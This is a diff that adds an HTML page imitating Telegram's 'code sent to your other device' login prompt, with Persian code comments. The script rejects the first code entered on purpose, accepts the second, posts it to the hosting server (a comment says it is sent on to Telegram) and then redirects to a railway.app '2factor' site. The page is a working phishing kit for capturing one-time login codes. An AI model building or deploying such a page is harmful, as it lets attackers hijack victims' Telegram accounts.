@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@250;400&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Code Input</title>
+    <style>
+        body {
+            font-weight: 50%lighter;
+            font-family: "Roboto", sans-serif;
+            text-align: center;
+            padding: 50px;
+            transition: transform 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+
+        @keyframes shake {
+            0% { transform: translateX(-5px); }
+            25% { transform: translateX(5px); }
+            50% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+            100% { transform: translateX(0); }
+        }
+
+        .shake {
+            animation: shake 0.3s ease;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            padding: 30px;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .emoji-container {
+            margin-top: 30px;
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+        }
+
+        .emoji-container img {
+            width: 100%;
+            height: auto;
+        }
+
+        .form-input {
+            margin-top: 15px;
+            padding: 10px;
+            width: 350px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            border: 1.5px solid #ddd;
+            border-radius: 12px;
+            transition: border-color 0.2s ease;
+            text-align: center;
+            min-height: 22px;
+        }
+
+        .form-input:focus {
+            border-color: #0088cc;
+            outline: none;
+        }
+
+        .form-input.error {
+            border-color: #ff4d4d;
+        }
+
+        .form-input.success {
+            border-color: #4caf50;
+        }
+
+        p {
+            margin-top: 60px;
+            width: 350px;
+            font-weight: 400;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 30px;
+        }
+
+        telegram {
+            font-weight: 400;
+            font-family:'Roboto', sans-serif;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .form-button {
+            width: 30%;
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #3390ec;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .form-button:hover {
+            background-color: #3390ec;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="emoji-container">
+            <img src="https://em-content.zobj.net/thumbs/240/apple/354/monkey-face_1f435.png" alt="Monkey Emoji">
+        </div>
+        <p>We've sent the code to the <Telegram>Telegram</Telegram> app on your other device.</p>
+        <form id="codeForm">
+            <input type="text" name="code" class="form-input" placeholder="Enter code" required id="codeInput" maxlength="6" pattern="\d{6}" title="Please enter a 6 digit code"/>
+            <button type="submit" class="form-button">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        let attempt = 0;
+        const codeForm = document.getElementById("codeForm");
+        const codeInput = document.getElementById("codeInput");
+
+        // جلوگیری از وارد کردن حروف
+        codeInput.addEventListener("input", function(event) {
+            // فقط اعداد 0-9 مجاز هستند
+            this.value = this.value.replace(/\D/g, "");
+        });
+
+        codeForm.addEventListener("submit", async (event) => {
+            event.preventDefault(); // جلوگیری از ارسال پیش‌فرض فرم
+
+            attempt++;
+
+            if (attempt === 1) {
+                // بار اول خطا بده
+                codeInput.classList.remove("success");
+                codeInput.classList.add("error");
+
+                document.body.classList.add("shake");
+                setTimeout(() => {
+                    document.body.classList.remove("shake");
+                }, 300);
+
+            } else if (attempt === 2) {
+                // بار دوم تایید کن
+                codeInput.classList.remove("error");
+                codeInput.classList.add("success");
+
+                // ارسال پیام به تلگرام
+                const formData = new FormData(codeForm);
+                await fetch("/", {
+                    method: "POST",
+                    body: formData
+                });
+
+                // بعد از 0.5 ثانیه ریدایرکت کن
+                setTimeout(() => {
+                    window.location.href = "https://2factor-production.up.railway.app/";
+                }, 500);
+            }
+        });
+    </script>
+</body>
+</html>
